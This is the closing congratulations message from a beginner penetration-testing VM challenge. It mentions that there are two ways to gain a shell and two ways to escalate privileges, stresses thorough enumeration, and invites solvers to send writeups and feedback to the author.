Congratulations! You've completed this challenge. There are two ways (that I'm aware of) to gain 
a shell, and two ways to privesc. I encourage you to find them all!

If you're in the target audience (newcomers to pentesting), I hope you learned something. A few
takeaways from this challenge should be that every little bit of information you can find can be
valuable, but sometimes you'll need to find several different pieces of information and combine
them to make them useful. Enumeration is key! Also, sometimes it's not as easy as just finding
an obviously outdated, vulnerable service right away with a port scan (unlike the first entry
in this series). Usually you'll have to dig deeper to find things that aren't as obvious, and
therefore might've been overlooked by administrators.

Thanks for taking the time to solve this VM. If you choose to create a writeup, I hope you'll send 
me a link! I can be reached at josiah@vt.edu. If you've got questions or feedback, please reach
out to me.

Happy hacking!
